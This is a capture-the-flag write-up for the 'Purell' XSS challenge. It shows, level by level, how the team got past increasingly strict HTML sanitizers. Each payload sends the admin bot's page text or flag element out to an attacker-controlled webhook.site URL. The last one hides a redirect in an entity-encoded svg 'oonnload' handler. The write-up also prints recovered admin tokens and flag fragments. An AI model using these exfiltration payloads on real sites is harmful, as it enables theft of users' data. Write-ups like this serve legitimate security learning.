# Purell writeups
### Team: UIT.4KySiNguLam

![image](https://github.com/user-attachments/assets/a99b683f-1c1a-4944-b89c-730da9a7fb2e)

## Overview
- The web appear as below:

![image](https://github.com/user-attachments/assets/59ee94f0-8131-4532-8fdb-44ce4af27139)

- Click `level 0`, we are redirected to this:

![image](https://github.com/user-attachments/assets/4f974d5f-2359-4131-9373-a62860f89651)

- From this and the fact that there was an admin bot to which an URL could be reported, I understood it was an XSS challenge. I didn’t read much of the attached files since they contained almost the same information as the website.
## Vulnerrability
- Actually, the vulnerability is XSS (Cross-Site Scripting).
## Exploitation
1. Level 0
- At level 0, there is no filter: `Sanitizer: (html) => html`.
- This is payload redirect to my **webhook.site**:
```HTML
<script>
  fetch('https://webhook.site/33b405ba-8b20-497a-9aea-917e2f20cf85?content=' + encodeURIComponent(document.body.innerText));
</script>
```
![image](https://github.com/user-attachments/assets/5d8c9043-23a8-4f69-a1b0-b700e0c8c3fe)

- Admin token: purell-token{gu4u_of_exf1l}
- Part 1 of flag: lactf{1_4m_z3_

2. Level 1
- At level 1, Sanitizer: `(html) => html.includes('script') || html.length > 150 ? 'nuh-uh' : html`
- It filter 'script' and length must be less or equal 150. Ignore the lenght constraint, for 'script' filter we can use uppercase to bypass this.
```HTML
<SCRIPT>
fetch('https://webhook.site/33b405ba-8b20-497a-9aea-917e2f20cf85?content=' + encodeURIComponent(document.body.innerText));
</SCRIPT>
```
![image](https://github.com/user-attachments/assets/f543dba3-2f61-4c87-878a-91b694a3257b)

- Admin token: purell-token{scr7ptl355_m3n4c3}
- Part 2 of flag: b3s7_x40ss_

3. Level 2
- At level 2, Sanitizer: `(html) => html.includes('script') || html.includes('on') || html.length > 150 ? 'nuh-uh' : html`
- It filter 'script', 'on' and length of payload must be less or equal 150. This is my payload.
```HTML
<SCRIPT>d=document,new Image().src='//webhook.site/33b405ba-8b20-497a-9aea-917e2f20cf85?'+d.body.innerText</SCRIPT>
```

![image](https://github.com/user-attachments/assets/05743743-4b6f-4a5b-bf9f-c7ad9fb8c847)


- Admin token: 
- Part 3 of flag: h4nd_g34m_

4. Level 3
- At level 3, Sanitizer: `(html) => html.toLowerCase().replaceAll('script', '').replaceAll('on', '')`
- It filter payload by replace 'script' and 'on' in lowercase with ''. For this filter, I use HTML Entity Encoding and insert trick 'oonnload' to bypass `onload`, `onclick`, `onerror`, `script`. This is my payload.
```HTML
<svg oonnload="&#x6c;&#x6f;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x3d;&#x27;&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x77;&#x65;&#x62;&#x68;&#x6f;&#x6f;&#x6b;&#x2e;&#x73;&#x69;&#x74;&#x65;&#x2f;&#x33;&#x33;&#x62;&#x34;&#x30;&#x35;&#x62;&#x61;&#x2d;&#x38;&#x62;&#x32;&#x30;&#x2d;&#x34;&#x39;&#x37;&#x61;&#x2d;&#x39;&#x61;&#x65;&#x61;&#x2d;&#x39;&#x31;&#x37;&#x65;&#x32;&#x66;&#x32;&#x30;&#x63;&#x66;&#x38;&#x35;&#x3f;&#x66;&#x6c;&#x61;&#x67;&#x3d;&#x27;&#x2b;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x71;&#x75;&#x65;&#x72;&#x79;&#x53;&#x65;&#x6c;&#x65;&#x63;&#x74;&#x6f;&#x72;&#x28;&#x27;&#x2e;&#x66;&#x6c;&#x61;&#x67;&#x27;&#x29;&#x2e;&#x69;&#x6e;&#x6e;&#x65;&#x72;&#x54;&#x65;&#x78;&#x74;" />
```
